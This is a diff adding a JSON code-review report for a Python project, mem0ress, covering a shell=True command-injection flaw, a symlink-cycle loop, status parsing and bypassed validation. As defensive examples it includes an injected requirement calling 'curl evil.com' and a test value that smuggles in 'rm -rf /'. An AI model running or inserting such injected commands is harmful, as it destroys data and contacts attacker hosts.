@@ -1,0 +1,89 @@
+{
+  "reviewer": "kieran-python",
+  "findings": [
+    {
+      "title": "shell=True with user-controlled command in _verify_tier2",
+      "severity": "P0",
+      "file": "src/mem0ress/harness/__init__.py",
+      "line": 132,
+      "confidence": 0.88,
+      "autofix_class": "gated_auto",
+      "owner": "review-fixer",
+      "requires_verification": true,
+      "pre_existing": false,
+      "why_it_matters": "Requirements from cognitive_triad are written by task authors into index.md files. A malicious or careless author could inject shell commands via requirements like shell:; curl evil.com. Using shell=True causes the shell to interpret metacharacters, pipeline operators, and env variables from the command string. While the task author is semi-trusted in normal usage, the pattern of embedding user strings directly into shell=True is fundamentally dangerous and creates a path for command injection.",
+      "evidence": [
+        "harness/__init__.py:128 cmd = req[6:].strip() \u2014 strips shell: prefix from user requirement",
+        "harness/__init__.py:132 shell=True \u2014 executes cmd via /bin/sh -c",
+        "cognitive_triad requirements are parsed from YAML and never sanitized"
+      ],
+      "suggested_fix": "Replace subprocess.run with shell=True by using shlex.split to parse the command, then call subprocess.run([...], shell=False). This prevents shell metacharacter injection. Example: import shlex; args = shlex.split(cmd); result = subprocess.run(args, shell=False, capture_output=True, text=True, timeout=30)"
+    },
+    {
+      "title": "find_git_repos BFS does not track visited directories \u2014 symlink cycles cause infinite loops",
+      "severity": "P2",
+      "file": "src/mem0ress/substrate/git_ops.py",
+      "line": 189,
+      "confidence": 0.7,
+      "autofix_class": "safe_auto",
+      "owner": "review-fixer",
+      "requires_verification": false,
+      "pre_existing": false,
+      "why_it_matters": "The BFS loop appends child directories to dirs_to_scan without deduplication. If a symlink creates a directory cycle (e.g., dir/a/b -> ../../), the same directory can be enqueued multiple times, causing an infinite loop. This would hang any code that calls find_git_repos on a workspace with symlink cycles.",
+      "evidence": [
+        "git_ops.py:191-207 \u2014 dirs_to_scan.pop(0) without visited tracking",
+        "git_ops.py:204 \u2014 child.is_dir() returns True for symlinks pointing to dirs",
+        "No visited set is maintained to break cycles"
+      ],
+      "suggested_fix": "Maintain a set of canonical real paths (using Path.resolve()) to detect already-visited directories. Example: visited = set(); while dirs_to_scan: current = dirs_to_scan.pop(0); real = current.resolve(); if real in visited: continue; visited.add(real); ..."
+    },
+    {
+      "title": "get_dirty_files assumes XY filename format but porcelain status codes can be 2 chars",
+      "severity": "P2",
+      "file": "src/mem0ress/substrate/git_ops.py",
+      "line": 164,
+      "confidence": 0.65,
+      "autofix_class": "safe_auto",
+      "owner": "review-fixer",
+      "requires_verification": false,
+      "pre_existing": false,
+      "why_it_matters": "Git porcelain status uses a 2-character XY format where X is index status and Y is worktree status. The code assumes line[2:] extracts the filename, but XY can be 2 characters meaning the filename actually starts at line[3:]. This means file paths starting with characters that git interprets as status codes could be silently truncated or mis-parsed.",
+      "evidence": [
+        "git_ops.py:164 parts = line[2:].strip() \u2014 assumes 2-char status + space prefix",
+        "Git porcelain format: XY filename where XY can be ? ,  M, MM, etc.",
+        "If a file starts with a space in its name or the status is 2 chars, indexing is wrong"
+      ],
+      "suggested_fix": "Use git status --porcelain -z for null-byte delimited output instead of parsing the XY format. This avoids ambiguity: result = subprocess.run([git, status, --porcelain, -z], cwd=repo_path, capture_output=True); files = result.stdout.split(\u0000)[:-1]"
+    },
+    {
+      "title": "intercept.py constructs TodoItem via dict instead of model constructor",
+      "severity": "P2",
+      "file": "src/mem0ress/gateway/intercept.py",
+      "line": 93,
+      "confidence": 0.75,
+      "autofix_class": "safe_auto",
+      "owner": "review-fixer",
+      "requires_verification": false,
+      "pre_existing": false,
+      "why_it_matters": "Line 93 constructs a todo dict with text and done keys and passes it to snapshot_session as a dict. But snapshot_session at line 99 calls TodoItem(text=t[text], done=t[done]). The dict keys are checked at runtime rather than at construction time. If the dict is malformed, the error occurs inside snapshot_session not at the call site. More importantly, it bypasses Pydantic validation.",
+      "evidence": [
+        "intercept.py:93 todos_lines.append(f\"text: {t[text]}, done: {t[done]}\")",
+        "intercept.py:99 TodoItem(text=t[text], done=t[done]) \u2014 uses dict access not model construction",
+        "The TodoItem model is frozen=True; direct construction enforces invariants"
+      ],
+      "suggested_fix": "Create TodoItem directly: todos=[TodoItem(text=t[text], done=t[done]) for t in todos] rather than serializing to string and parsing. Or pass manifest.todos directly to snapshot_session instead of converting to dicts and back."
+    }
+  ],
+  "residual_risks": [
+    "Tier 2 requirements come from cognitive_triad.requirements \u2014 if a task author writes malicious shell commands, they execute with host permissions. There is no sandboxing or timeout beyond the 30s limit.",
+    "find_git_repos on workspaces with complex symlink structures (common in monorepos) could hang.",
+    "The intercept.py Tier 0 check is a stub (TODO comment at line 212) \u2014 constraints are never actually enforced."
+  ],
+  "testing_gaps": [
+    "No test for shell injection in Tier 2 (e.g., requirements=[\"shell:echo x; rm -rf /\"])",
+    "No test for symlink cycle in find_git_repos",
+    "No test for get_dirty_files with 2-char porcelain status codes",
+    "No test for intercept.py with malformed todos dict",
+    "No test for snapshot_session with non-existent task_id"
+  ]
+}
